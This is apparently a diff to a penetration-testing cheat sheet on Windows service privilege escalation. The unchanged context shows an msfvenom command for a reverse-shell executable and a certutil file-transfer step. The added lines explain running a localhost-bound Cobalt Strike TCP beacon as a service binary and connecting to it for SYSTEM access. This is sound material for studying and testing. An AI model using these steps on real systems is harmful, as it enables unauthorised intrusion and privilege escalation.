@@ -74,6 +74,11 @@ To quickly create a malicious payload:
 msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f exe -o name.exe
 ```
 
+In Cobalt Strike, use TCP beacons bound to localhost for priv esc. The beacon will have svc in the filename when using the CS generate all option. 
+
+
+
+
 ### Transfer the file 
 
 You could host the file using SimpleHTTPServer and then use certutil:
@@ -137,3 +142,18 @@ set session x
 exploit
 ```
 
+## Exploiting with Cobalt Strike
+
+- Use a TCP beacon bound to localhost as the service binary
+- After the service is stopped/restarted verify that there is a tcp listener on localhost using the port configured in CS
+
+```
+netstat -anp tcp
+```
+- Connect to the beacon
+
+```
+connect localhost <port>
+```
+
+- You should then see the listener running as SYSTEM or whatever privileges you have gained. 
